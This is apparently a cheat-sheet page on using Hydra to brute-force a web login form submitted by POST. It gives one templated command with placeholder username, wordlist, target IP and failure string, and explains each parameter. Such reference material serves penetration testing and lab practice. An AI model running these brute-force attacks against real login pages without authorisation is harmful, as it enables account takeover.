---
sidebar_position: 2
title: Hydra
---

## HYDRA [WEB AUTH]


- **Brute-Force `POST` Login-Form**

```html
hydra -l <username> -P <password> <ip> http-post-form "/<login_url>:username=^USER^&password=^PASS^:F=Incorrect"
```

<br/>

- **Parameters**

```sql
-l                  # Single Username
-P                  # Wordlist
http-post-form      # Indicates the Type of Form [POST]
/login_url          # Login Page URL
:username           # The form field where the Username is Entered
^USER^              # Tells HYDRA to user the Specified Username
password            # The form field where the Password is Entered
^PASS^              # Tells HYDRA to user the Specified Password
F=Incorrect         # If this [Message] appears on the Page its Incorrect [Note: The Response Message is Important]
-V                  # Verbose Output
```